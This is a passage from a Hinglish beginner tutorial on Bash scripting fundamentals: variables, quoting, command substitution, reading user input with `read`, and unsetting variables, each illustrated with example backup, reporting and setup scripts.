- ✅ **Data storage** - Values ko reuse karna
- ✅ **Flexibility** - Ek jagah change, har jagah effect
- ✅ **Readability** - Code samajhna easy
- ✅ **Dynamic scripts** - Runtime par values change karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab koi value multiple jagah use karni ho
- Configuration settings ke liye
- User input store karne ke liye
- Calculations aur data processing mein

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Har jagah hardcoded values (maintenance nightmare)
- Code repetitive aur error-prone
- Dynamic behavior impossible
- Professional scripts nahi bana paoge

### 6. **Syntax aur Common Options**

```bash
# Variable create karna (NO SPACES!)
name=value
age=25
path=/home/user

# Access karna
echo $name
echo ${name}

# Spaces wale values (quotes zaroori)
full_name="John Doe"
message='Hello World'

# Command output store
current_date=$(date)
file_count=$(ls | wc -l)

# Empty variable
empty_var=""

# Unset variable
unset variable_name
```

**Important Rules:**
- No spaces around `=`
- `$var` ya `${var}` se access
- Quotes use karo spaces ke liye
- Case-sensitive hain

### 7. **Example 1 (Basic)**

```bash
# Simple variables
$ name="Satish"
$ age=25
$ echo "My name is $name and I am $age years old"
My name is Satish and I am 25 years old

# Path variable
$ backup_dir="/backups"
$ echo "Backup location: $backup_dir"
Backup location: /backups

# Command substitution
$ today=$(date +%Y-%m-%d)
$ echo "Today is $today"
Today is 2024-01-15
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Backup script with variables

# Configuration variables
BACKUP_SOURCE="/home/user/documents"
BACKUP_DEST="/backups"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_NAME="backup_${DATE}.tar.gz"
LOG_FILE="/var/log/backup.log"
MAX_BACKUPS=7

# Derived variables
FULL_BACKUP_PATH="${BACKUP_DEST}/${BACKUP_NAME}"

# Start backup
echo "=== Backup Started at $(date) ===" | tee -a "$LOG_FILE"
echo "Source: $BACKUP_SOURCE" | tee -a "$LOG_FILE"
echo "Destination: $FULL_BACKUP_PATH" | tee -a "$LOG_FILE"

# Create backup
if tar -czf "$FULL_BACKUP_PATH" "$BACKUP_SOURCE" 2>> "$LOG_FILE"; then
    echo "✓ Backup successful" | tee -a "$LOG_FILE"
    
    # Get backup size
    BACKUP_SIZE=$(du -h "$FULL_BACKUP_PATH" | cut -f1)
    echo "Backup size: $BACKUP_SIZE" | tee -a "$LOG_FILE"
else
    echo "✗ Backup failed!" | tee -a "$LOG_FILE"
    exit 1
fi

# Cleanup old backups
echo "Cleaning up old backups (keeping last $MAX_BACKUPS)..." | tee -a "$LOG_FILE"
cd "$BACKUP_DEST"
ls -t backup_*.tar.gz | tail -n +$((MAX_BACKUPS + 1)) | xargs -r rm -v

echo "=== Backup Completed at $(date) ===" | tee -a "$LOG_FILE"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Spaces around =:** `name = value` galat, `name=value` sahi
- ❌ **$ bhoolna:** `echo name` literal print karega, `echo $name` value print karega
- ❌ **Quotes nahi use karna:** Spaces wali values ke liye quotes zaroori

### 10. **Best Practices / Pro Tips**
- 💡 **Uppercase for constants:** `MAX_SIZE=100`, lowercase for regular vars
- 💡 **Meaningful names:** `backup_dir` better than `bd`
- 💡 **Braces use karo:** `${var}` safer than `$var`
- 💡 **Quotes hamesha:** `"$var"` safe, `$var` risky

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek deployment script bana rahe hain:

```bash
#!/bin/bash
# Deployment configuration

# Environment variables
ENV="production"
APP_NAME="myapp"
APP_VERSION="2.1.0"

# Paths
APP_DIR="/var/www/${APP_NAME}"
BACKUP_DIR="/backups/${APP_NAME}"
LOG_DIR="/var/log/${APP_NAME}"

# Database
DB_HOST="localhost"
DB_NAME="${APP_NAME}_${ENV}"
DB_USER="${APP_NAME}_user"

# Deployment
DEPLOY_TIME=$(date +%Y%m%d_%H%M%S)
BACKUP_NAME="${APP_NAME}_backup_${DEPLOY_TIME}.tar.gz"

echo "Deploying $APP_NAME v$APP_VERSION to $ENV"
echo "Database: $DB_NAME on $DB_HOST"
echo "Backup: $BACKUP_DIR/$BACKUP_NAME"

# Ek jagah change karo, har jagah update ho jayega!
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `var=value` - No spaces!
- ✅ `$var` ya `${var}` - Access karna
- ✅ Quotes use karo spaces ke liye
- ✅ `$(command)` - Command output store
- ✅ Meaningful names use karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `$var` aur `${var}` mein kya fark hai?**
A: Functionally same, lekin `${var}` safer hai jab variable ke saath text ho: `${var}_suffix`

**Q2: Kya variables case-sensitive hain?**
A: Haan! `name` aur `NAME` alag variables hain.

**Q3: Variable ki value kaise check karu?**
A: `echo "$var"` ya `echo "${var:-default}"` (default value ke saath)

### 14. **Practice ke liye Task**

```bash
# 1. Simple variables
name="Your Name"
age=25
echo "Name: $name, Age: $age"

# 2. Path variables
home_dir="/home/user"
backup_dir="$home_dir/backups"
echo "Backup: $backup_dir"

# 3. Command substitution
current_time=$(date +%H:%M:%S)
echo "Time: $current_time"

# 4. Calculations
count=10
total=$((count * 2))
echo "Total: $total"

# 5. Braces practice
prefix="file"
echo "${prefix}_1.txt"
echo "${prefix}_2.txt"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📦 Variables data store karte hain
- 🔧 `var=value` (no spaces!)
- 💲 `$var` ya `${var}` se access
- 📝 Quotes use karo spaces ke liye
- 🎯 Meaningful names = readable code

> **💡 Ye Zaroor Yaad Rakhein:**
> Variables scripting ka foundation hain! Hamesha quotes use karo (`"$var"`), spaces se bacho (`var=value`), aur meaningful names do. `${var}` safer hai `$var` se!

---

## **Topic 2: Quoting (Single Quotes `'...'` vs Double Quotes `"..."`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Quoting** - Single aur double quotes ka sahi use samajhna.

### 2. **Ye Kya Hai? (What is it?)**
Bash mein do tarah ke quotes hain: single quotes (`'...'`) jo sab kuch literal treat karte hain, aur double quotes (`"..."`) jo variables aur commands ko expand karte hain. Yeh difference critical hai!

**Analogy:** Single quotes ek sealed glass box hain - andar jo hai woh exactly waise hi rahega. Double quotes ek transparent box hain - andar ki cheezein process ho sakti hain (variables expand, commands run).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Spaces handle karna** - File names mein spaces
- ✅ **Variable expansion control** - Kab expand ho, kab nahi
- ✅ **Security** - Injection attacks se bachna
- ✅ **Predictable behavior** - Unexpected results avoid karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Single quotes: Literal text chahiye (no expansion)
- Double quotes: Variables expand karne hain
- File paths aur user input ke liye
- Command substitution ke liye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Word splitting issues (spaces wali files)
- Variables expand nahi honge (single quotes mein)
- Security vulnerabilities
- Unpredictable script behavior

### 6. **Syntax aur Common Options**

```bash
# Single quotes - LITERAL (no expansion)
echo 'Hello $USER'          # Prints: Hello $USER
echo 'Today is $(date)'     # Prints: Today is $(date)

# Double quotes - EXPANSION
echo "Hello $USER"          # Prints: Hello satish
echo "Today is $(date)"     # Prints: Today is Mon Jan 15...

# No quotes - DANGEROUS with spaces
file=my file.txt            # ERROR!
file="my file.txt"          # Correct

# Escaping
echo "Price: \$100"         # Prints: Price: $100
echo "Path: \"$HOME\""      # Prints: Path: "/home/user"
```

**Key Differences:**
- `'text'` - Everything literal
- `"text"` - Variables/commands expand
- No quotes - Word splitting happens
- `\` - Escape special characters

### 7. **Example 1 (Basic)**

```bash
# Single vs Double quotes
$ name="Satish"
$ echo 'Hello $name'
Hello $name

$ echo "Hello $name"
Hello Satish

# Spaces problem
$ file=my file.txt
bash: file.txt: command not found

$ file="my file.txt"
$ echo "$file"
my file.txt

# Command substitution
$ echo 'Today is $(date)'
Today is $(date)

$ echo "Today is $(date)"
Today is Mon Jan 15 10:30:00 IST 2024
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File processor with proper quoting

SOURCE_DIR="/data/input"
DEST_DIR="/data/output"

echo "Processing files from: $SOURCE_DIR"

# WRONG - will break with spaces in filenames
# for file in $(ls $SOURCE_DIR); do

# CORRECT - proper quoting
for file in "$SOURCE_DIR"/*; do
    [ -f "$file" ] || continue
    
    filename=$(basename "$file")
    echo "Processing: $filename"
    
    # Proper quoting in commands
    if [ -r "$file" ]; then
        # Process file
        cat "$file" | tr '[:lower:]' '[:upper:]' > "$DEST_DIR/$filename"
        echo "✓ Processed: $filename"
    else
        echo "✗ Cannot read: $filename"
    fi
done

# Literal text in config
cat > config.txt << 'EOF'
# This is literal - variables won't expand
USER=$USER
HOME=$HOME
PATH=$PATH
EOF

# Expanded text in config
cat > config_expanded.txt << EOF
# This will expand variables
USER=$USER
HOME=$HOME
PATH=$PATH
EOF

echo "Compare the two config files!"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Variables mein single quotes:** `echo 'Hello $name'` expand nahi hoga
- ❌ **Paths mein quotes nahi:** Spaces wale paths break honge
- ❌ **Command substitution mein single quotes:** `'$(date)'` literal rahega

### 10. **Best Practices / Pro Tips**
- 💡 **Default: double quotes** - Variables ke liye hamesha `"$var"`
- 💡 **Literal text: single quotes** - Jab expansion nahi chahiye
- 💡 **Paths hamesha quote karo** - `"$HOME/my file.txt"`
- 💡 **User input hamesha quote karo** - Security ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek file backup script bana rahe hain jo spaces wale filenames handle kare:

```bash
#!/bin/bash
# Robust backup script with proper quoting

BACKUP_SOURCE="$HOME/My Documents"  # Space in path!
BACKUP_DEST="/backups"
DATE=$(date +%Y%m%d)

echo "Backing up: $BACKUP_SOURCE"

# Create backup directory
mkdir -p "$BACKUP_DEST/$DATE"

# Process each file (handles spaces correctly)
find "$BACKUP_SOURCE" -type f | while IFS= read -r file; do
    # Get relative path
    rel_path="${file#$BACKUP_SOURCE/}"
    dest_file="$BACKUP_DEST/$DATE/$rel_path"
    
    # Create directory structure
    dest_dir=$(dirname "$dest_file")
    mkdir -p "$dest_dir"
    
    # Copy file (proper quoting!)
    if cp "$file" "$dest_file"; then
        echo "✓ Backed up: $rel_path"
    else
        echo "✗ Failed: $rel_path"
    fi
done

echo "Backup complete!"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `'text'` - Literal, no expansion
- ✅ `"text"` - Variables expand
- ✅ `"$var"` - Hamesha quote karo
- ✅ Spaces wale paths quote karo
- ✅ User input quote karo (security)

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kab single quotes, kab double quotes?**
A: Variables chahiye? Double quotes. Literal text chahiye? Single quotes.

**Q2: Kya main quotes ke andar quotes use kar sakta hoon?**
A: Haan, escape karo: `echo "He said \"Hello\""`

**Q3: No quotes kab safe hai?**
A: Jab guaranteed no spaces hon, lekin safer hai hamesha quote karna.

### 14. **Practice ke liye Task**

```bash
# 1. Single vs Double
name="Satish"
echo 'Name: $name'
echo "Name: $name"

# 2. Command substitution
echo 'Date: $(date)'
echo "Date: $(date)"

# 3. Spaces handling
file="my file.txt"
touch "$file"
ls -l "$file"
rm "$file"

# 4. Escaping
echo "Price: \$100"
echo "Path: \"$HOME\""

# 5. Here Doc literal
cat << 'EOF'
Variables won't expand: $HOME
Command won't run: $(date)
EOF

# 6. Here Doc expanded
cat << EOF
Variables will expand: $HOME
Command will run: $(date)
EOF
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔒 Single quotes = literal (no expansion)
- 🔓 Double quotes = expansion (variables/commands)
- 📁 Paths hamesha quote karo
- 🛡️ User input quote karo (security)
- 💡 Default: `"$var"` use karo

> **💡 Ye Zaroor Yaad Rakhein:**
> Quoting Bash ka sabse confusing topic hai! Rule yaad rakho: Variables chahiye? Double quotes (`"$var"`). Literal text? Single quotes (`'text'`). Hamesha quote karo - safer hai!

---

## **Topic 3: Command Substitution (`var=$(command)`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Command Substitution** - Command ka output variable mein store karna.

### 2. **Ye Kya Hai? (What is it?)**
Command substitution aapko kisi command ka output capture karke variable mein store karne deta hai. Modern syntax `$(command)` hai, purana syntax `` `command` `` (backticks) hai.

**Analogy:** Socho ki aap ek machine se output le rahe hain aur use ek box mein pack kar rahe hain. Machine = command, box = variable, packing process = command substitution.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Dynamic values** - Runtime par values generate karna
- ✅ **Automation** - Command outputs ko process karna
- ✅ **Calculations** - Math operations ke results store karna
- ✅ **System info** - System data collect karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Date/time stamps chahiye
- File counts, sizes calculate karne hain
- System information collect karni hai
- Command outputs ko further process karna hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Dynamic scripts nahi bana paoge
- Hardcoded values use karni padegi
- Automation limited rahega
- Real-time data nahi le paoge

### 6. **Syntax aur Common Options**

```bash
# Modern syntax (RECOMMENDED)
var=$(command)
var=$(command arg1 arg2)

# Old syntax (avoid)
var=`command`

# Nested substitution
var=$(command1 $(command2))

# With pipes
var=$(command1 | command2)

# Multi-line
var=$(
    command1
    command2
)
```

**Common Uses:**
- `$(date)` - Current date/time
- `$(whoami)` - Current user
- `$(pwd)` - Current directory
- `$(ls | wc -l)` - File count
- `$(hostname)` - Machine name

### 7. **Example 1 (Basic)**

```bash
# Date and time
$ today=$(date +%Y-%m-%d)
$ echo "Today: $today"
Today: 2024-01-15

$ timestamp=$(date +%Y%m%d_%H%M%S)
$ echo "Timestamp: $timestamp"
Timestamp: 20240115_103045

# System info
$ current_user=$(whoami)
$ echo "User: $current_user"
User: satish

$ machine=$(hostname)
$ echo "Machine: $machine"
Machine: myserver

# File operations
$ file_count=$(ls | wc -l)
$ echo "Files: $file_count"
Files: 25
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System report generator using command substitution

REPORT_FILE="/tmp/system_report_$(date +%Y%m%d).txt"

# System information
HOSTNAME=$(hostname)
KERNEL=$(uname -r)
UPTIME=$(uptime -p)
CURRENT_USER=$(whoami)
CURRENT_TIME=$(date '+%Y-%m-%d %H:%M:%S')

# Disk usage
DISK_TOTAL=$(df -h / | awk 'NR==2 {print $2}')
DISK_USED=$(df -h / | awk 'NR==2 {print $3}')
DISK_PERCENT=$(df -h / | awk 'NR==2 {print $5}')

# Memory usage
MEM_TOTAL=$(free -h | awk 'NR==2 {print $2}')
MEM_USED=$(free -h | awk 'NR==2 {print $3}')
MEM_FREE=$(free -h | awk 'NR==2 {print $4}')

# CPU info
CPU_MODEL=$(lscpu | grep "Model name" | cut -d: -f2 | xargs)
CPU_CORES=$(nproc)

# Network
IP_ADDRESS=$(hostname -I | awk '{print $1}')

# Process count
PROCESS_COUNT=$(ps aux | wc -l)
USER_PROCESS=$(ps -u "$CURRENT_USER" | wc -l)

# Generate report
cat > "$REPORT_FILE" << EOF
================================
   SYSTEM HEALTH REPORT
================================
Generated: $CURRENT_TIME
Hostname: $HOSTNAME
User: $CURRENT_USER

=== SYSTEM INFO ===
Kernel: $KERNEL
Uptime: $UPTIME
IP Address: $IP_ADDRESS

=== CPU ===
Model: $CPU_MODEL
Cores: $CPU_CORES

=== MEMORY ===
Total: $MEM_TOTAL
Used: $MEM_USED
Free: $MEM_FREE

=== DISK (/) ===
Total: $DISK_TOTAL
Used: $DISK_USED ($DISK_PERCENT)

=== PROCESSES ===
Total: $PROCESS_COUNT
User processes: $USER_PROCESS

================================
EOF

echo "Report generated: $REPORT_FILE"
cat "$REPORT_FILE"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Backticks use karna:** `` `command` `` purana hai, `$(command)` use karo
- ❌ **Quotes nahi use karna:** `var=$(command)` safe, lekin `"$(command)"` safer
- ❌ **Nested backticks:** Confusing aur error-prone

### 10. **Best Practices / Pro Tips**
- 💡 **`$()` prefer karo:** Backticks se better, nestable
- 💡 **Quotes use karo:** `"$(command)"` safer
- 💡 **Error handling:** Check karo command successful hui ya nahi
- 💡 **Performance:** Unnecessary command substitution avoid karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek automated backup script bana rahe hain:

```bash
#!/bin/bash
# Intelligent backup with command substitution

# Dynamic naming
BACKUP_DATE=$(date +%Y%m%d)
BACKUP_TIME=$(date +%H%M%S)
BACKUP_NAME="backup_${BACKUP_DATE}_${BACKUP_TIME}.tar.gz"

# Source and destination
SOURCE="/home/$(whoami)/documents"
DEST="/backups/$(hostname)"

# Pre-backup checks
AVAILABLE_SPACE=$(df "$DEST" | awk 'NR==2 {print $4}')
SOURCE_SIZE=$(du -s "$SOURCE" | awk '{print $1}')

echo "=== Backup Analysis ==="
echo "Source: $SOURCE"
echo "Source size: $(du -sh "$SOURCE" | cut -f1)"
echo "Destination: $DEST"
echo "Available space: $(df -h "$DEST" | awk 'NR==2 {print $4}')"

# Check if enough space
if [ "$AVAILABLE_SPACE" -lt "$SOURCE_SIZE" ]; then
    echo "✗ Not enough space!"
    exit 1
fi

# Create backup
echo "Creating backup: $BACKUP_NAME"
START_TIME=$(date +%s)

tar -czf "$DEST/$BACKUP_NAME" "$SOURCE"

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

# Backup info
BACKUP_SIZE=$(du -h "$DEST/$BACKUP_NAME" | cut -f1)

echo "✓ Backup complete!"
echo "File: $BACKUP_NAME"
echo "Size: $BACKUP_SIZE"
echo "Duration: ${DURATION}s"

# Cleanup old backups (keep last 7 days)
CUTOFF_DATE=$(date -d '7 days ago' +%Y%m%d)
echo "Cleaning backups older than $CUTOFF_DATE..."

cd "$DEST"
for backup in backup_*.tar.gz; do
    backup_date=$(echo "$backup" | grep -oP '\d{8}' | head -1)
    if [ "$backup_date" -lt "$CUTOFF_DATE" ]; then
        echo "Removing: $backup"
        rm "$backup"
    fi
done
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `$(command)` - Modern syntax
- ✅ `` `command` `` - Old syntax (avoid)
- ✅ `"$(command)"` - Quote karo
- ✅ Nested: `$(cmd1 $(cmd2))`
- ✅ Dynamic values ke liye perfect

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `$()` aur backticks mein kya fark hai?**
A: `$()` modern, readable, aur nestable hai. Backticks purane aur confusing hain.

**Q2: Kya command substitution slow hai?**
A: Haan, thoda. Unnecessary use avoid karo, especially loops mein.

**Q3: Kya main multiple commands ek saath run kar sakta hoon?**
A: Haan! `var=$(cmd1; cmd2; cmd3)` ya pipes use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Date operations
today=$(date +%Y-%m-%d)
echo "Today: $today"

# 2. System info
user=$(whoami)
host=$(hostname)
echo "User: $user on $host"

# 3. File operations
count=$(ls | wc -l)
echo "Files: $count"

# 4. Nested substitution
home_files=$(ls $(echo $HOME) | wc -l)
echo "Home files: $home_files"

# 5. With pipes
top_process=$(ps aux | sort -k3 -rn | head -1 | awk '{print $11}')
echo "Top process: $top_process"

# 6. Math
total=$(($(ls | wc -l) * 2))
echo "Double count: $total"

# 7. Multi-line
info=$(
    echo "User: $(whoami)"
    echo "Date: $(date)"
    echo "PWD: $(pwd)"
)
echo "$info"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔄 Command output ko variable mein store karta hai
- 💻 `$(command)` modern syntax (recommended)
- 📦 Dynamic values generate karne ke liye
- 🔗 Nestable aur pipeable
- ⚡ Performance conscious use karo

> **💡 Ye Zaroor Yaad Rakhein:**
> Command substitution dynamic scripts ka heart hai! Hamesha `$(command)` use karo, backticks nahi. Quote karo `"$(command)"` aur loops mein unnecessary use avoid karo!

---

## **Topic 4: User Input (`read`, `read -p`, `read -s`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**User Input** - Scripts ko interactive banana user se input lekar.

### 2. **Ye Kya Hai? (What is it?)**
`read` command user se input lene ke liye use hota hai. Yeh scripts ko interactive banata hai - user kuch type kare aur script use process kare. `-p` prompt dikhata hai, `-s` silent mode (passwords ke liye).

**Analogy:** Socho ki script ek form hai. `read` woh fields hain jahan user information bharta hai. `-p` field ka label hai, `-s` woh field hai jahan typing dikhai nahi deti (password field).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Interactive scripts** - User-friendly applications
- ✅ **Flexibility** - Runtime par decisions
- ✅ **Configuration** - User preferences lena
- ✅ **Security** - Passwords safely input karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- User se configuration chahiye
- Confirmation lena ho (yes/no)
- Passwords ya sensitive data
- Interactive menus banate waqt

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Scripts non-interactive rahenge
- Hardcoded values use karni padegi
- User-friendly applications nahi bana paoge
- Passwords plain text mein store honge

### 6. **Syntax aur Common Options**

```bash
# Basic read
read variable

# With prompt
read -p "Enter name: " name

# Silent (for passwords)
read -s -p "Enter password: " password

# Multiple variables
read var1 var2 var3

# With timeout
read -t 5 -p "Enter (5 sec): " input

# Array input
read -a array

# Default value
read -p "Enter name [default]: " name
name=${name:-default}
```

**Important Options:**
- `-p` : Prompt message
- `-s` : Silent (no echo)
- `-t` : Timeout in seconds
- `-n` : Read N characters
- `-a` : Read into array

### 7. **Example 1 (Basic)**

```bash
# Simple input
$ read name
Satish
$ echo "Hello $name"
Hello Satish

# With prompt
$ read -p "Enter your age: " age
Enter your age: 25
$ echo "You are $age years old"
You are 25 years old

# Silent input (password)
$ read -s -p "Enter password: " pass
Enter password: 
$ echo "Password saved (hidden)"
Password saved (hidden)

# Multiple inputs
$ read -p "Enter first and last name: " first last
Enter first and last name: John Doe
$ echo "First: $first, Last: $last"
First: John, Last: Doe
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Interactive system setup script

echo "=== System Setup Wizard ==="
echo ""

# User information
read -p "Enter username: " username
read -p "Enter email: " email

# Password with confirmation
while true; do
    read -s -p "Enter password: " password
    echo ""
    read -s -p "Confirm password: " password2
    echo ""
    
    if [ "$password" = "$password2" ]; then
        echo "✓ Password confirmed"
        break
    else
        echo "✗ Passwords don't match. Try again."
    fi
done

# Configuration options
read -p "Enable SSH? (y/n): " ssh_enable
read -p "Install Docker? (y/n): " docker_install

# Backup location
read -p "Backup directory [/backups]: " backup_dir
backup_dir=${backup_dir:-/backups}

# Confirmation
echo ""
echo "=== Configuration Summary ==="
echo "Username: $username"
echo "Email: $email"
echo "SSH: $ssh_enable"
echo "Docker: $docker_install"
echo "Backup: $backup_dir"
echo ""

read -p "Proceed with setup? (y/n): " confirm

if [ "$confirm" = "y" ]; then
    echo "Setting up system..."
    
    # Create user
    useradd -m -s /bin/bash "$username"
    echo "$username:$password" | chpasswd
    
    # SSH setup
    if [ "$ssh_enable" = "y" ]; then
        systemctl enable ssh
        systemctl start ssh
        echo "✓ SSH enabled"
    fi
    
    # Docker installation
    if [ "$docker_install" = "y" ]; then
        apt-get update
        apt-get install -y docker.io
        usermod -aG docker "$username"
        echo "✓ Docker installed"
    fi
    
    # Create backup directory
    mkdir -p "$backup_dir"
    chown "$username:$username" "$backup_dir"
    echo "✓ Backup directory created"
    
    echo ""
    echo "✓ Setup complete!"
else
    echo "Setup cancelled."
    exit 0
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Password echo:** `read password` ki jagah `read -s password` use karo
- ❌ **Validation nahi karna:** User input hamesha validate karo
- ❌ **Timeout nahi dena:** Long-running scripts mein timeout useful

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha prompt do:** `-p` use karo clarity ke liye
- 💡 **Passwords silent:** `-s` zaroori hai
- 💡 **Default values:** `${var:-default}` pattern use karo
- 💡 **Validate input:** User input kabhi trust mat karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek database backup script bana rahe hain:

```bash
#!/bin/bash
# Interactive database backup

echo "=== Database Backup Tool ==="

# Database selection
echo "Available databases:"
mysql -u root -p"$DB_ROOT_PASS" -e "SHOW DATABASES;" | grep -v "Database\|information_schema\|performance_schema"

read -p "Enter database name: " db_name

# Validate database exists
if ! mysql -u root -p"$DB_ROOT_PASS" -e "USE $db_name" 2>/dev/null; then
    echo "✗ Database not found!"
    exit 1
fi

# Backup location
read -p "Backup directory [/backups]: " backup_dir
backup_dir=${backup_dir:-/backups}

# Compression
read -p "Compress backup? (y/n) [y]: " compress
compress=${compress:-y}

# Confirmation
echo ""
echo "Database: $db_name"
echo "Location: $backup_dir"
echo "Compress: $compress"
read -p "Proceed? (y/n): " confirm

if [ "$confirm" != "y" ]; then
    echo "Backup cancelled."
    exit 0
fi

# Create backup
mkdir -p "$backup_dir"
backup_file="$backup_dir/${db_name}_$(date +%Y%m%d_%H%M%S).sql"

echo "Creating backup..."
mysqldump -u root -p"$DB_ROOT_PASS" "$db_name" > "$backup_file"

if [ "$compress" = "y" ]; then
    echo "Compressing..."
    gzip "$backup_file"
    backup_file="${backup_file}.gz"
fi

echo "✓ Backup complete: $backup_file"
echo "Size: $(du -h "$backup_file" | cut -f1)"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `read var` - Basic input
- ✅ `read -p "prompt: " var` - With prompt
- ✅ `read -s` - Silent (passwords)
- ✅ `read -t N` - Timeout
- ✅ Hamesha validate karo input

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kya main default value set kar sakta hoon?**
A: Haan! `read -p "Name [default]: " name; name=${name:-default}`

**Q2: Multiple lines kaise read karu?**
A: Loop use karo ya `read` ko multiple baar call karo.

**Q3: Timeout ke baad kya hota hai?**
A: Variable empty rahta hai aur script continue hoti hai.

### 14. **Practice ke liye Task**

```bash
# 1. Basic input
read -p "Enter your name: " name
echo "Hello $name"

# 2. Password input
read -s -p "Enter password: " pass
echo ""
echo "Password length: ${#pass}"

# 3. Multiple inputs
read -p "Enter first and last name: " first last
echo "First: $first, Last: $last"

# 4. Yes/No confirmation
read -p "Continue? (y/n): " answer
if [ "$answer" = "y" ]; then
    echo "Continuing..."
else
    echo "Stopped."
fi

# 5. Default value
read -p "Enter port [8080]: " port
port=${port:-8080}
echo "Using port: $port"

# 6. Timeout
read -t 5 -p "Quick! Enter something (5 sec): " quick
echo "You entered: $quick"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📥 `read` user se input leta hai
- 💬 `-p` prompt dikhata hai
- 🔒 `-s` passwords ke liye (silent)
- ⏱️ `-t` timeout set karta hai
- ✅ Hamesha input validate karo

> **💡 Ye Zaroor Yaad Rakhein:**
> User input kabhi trust mat karo! Hamesha validate karo, default values do, aur passwords ke liye `-s` use karo. Interactive scripts user-friendly hoti hain!

---

## **Topic 5: Unsetting Variables (`unset`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Unsetting Variables** - Variables ko delete karna aur memory free karna.

### 2. **Ye Kya Hai? (What is it?)**
`unset` command variables ko completely remove kar deta hai - na sirf value empty karti hai, balki variable ka existence hi khatam kar deti hai. Yeh memory cleanup aur security ke liye useful hai.

**Analogy:** Socho ki variable ek labeled box hai. Empty karna (`var=""`) matlab box khali kar do lekin box rahe. Unset karna (`unset var`) matlab box hi phek do - ab woh exist hi nahi karta.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Memory management** - Unused variables cleanup
- ✅ **Security** - Sensitive data remove karna
- ✅ **Clean state** - Variables ko reset karna
- ✅ **Debugging** - Variable existence test karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Sensitive data (passwords) use karne ke baad
- Temporary variables cleanup
- Functions mein local cleanup
- Script end par cleanup

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Memory waste (unused variables)
- Security risk (passwords memory mein)
- Variable pollution
- Debugging confusion

### 6. **Syntax aur Common Options**

```bash
# Unset single variable
unset variable_name

# Unset multiple variables
unset var1 var2 var3

# Unset array
unset array_name

# Unset array element
unset array_name[index]

# Check if variable is set
if [ -z ${var+x} ]; then
    echo "var is unset"
else
    echo "var is set"
fi
```

**Important Concepts:**
- `unset var` - Variable delete
- `var=""` - Variable empty (still exists)
- `-z ${var+x}` - Check if unset
- Functions mein `local` use karo

### 7. **Example 1 (Basic)**

```bash
# Set variable
$ password="secret123"
$ echo "Password: $password"
Password: secret123

# Empty vs Unset
$ password=""
$ echo "Password: $password"
Password: 
$ echo "Length: ${#password}"
Length: 0

# Unset
$ password="secret123"
$ unset password
$ echo "Password: $password"
Password: 
$ echo "Length: ${#password}"
Length: 0

# Check if set
$ name="Satish"
$ [ -z ${name+x} ] && echo "unset" || echo "set"
set

$ unset name
$ [ -z ${name+x} ] && echo "unset" || echo "set"
unset
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Secure script with proper cleanup

# Trap to ensure cleanup on exit
cleanup() {
    echo "Cleaning up sensitive data..."
    unset DB_PASSWORD
    unset API_KEY
    unset SECRET_TOKEN
    echo "✓ Cleanup complete"
}

trap cleanup EXIT

# Function with local variables
process_data() {
    local temp_var="temporary data"
    local counter=0
    
    echo "Processing..."
    # Do work
    
    # Local variables automatically cleaned up
    # But explicit unset is good practice
    unset temp_var
    unset counter
}

# Main script
echo "=== Secure Data Processing ==="

# Get sensitive data
read -s -p "Enter database password: " DB_PASSWORD
echo ""
read -s -p "Enter API key: " API_KEY
echo ""

# Use the data
echo "Connecting to database..."
# mysql -u user -p"$DB_PASSWORD" ...

echo "Calling API..."
# curl -H "Authorization: $API_KEY" ...

# Process data
process_data

# Explicit cleanup of sensitive data
echo "Removing sensitive data from memory..."
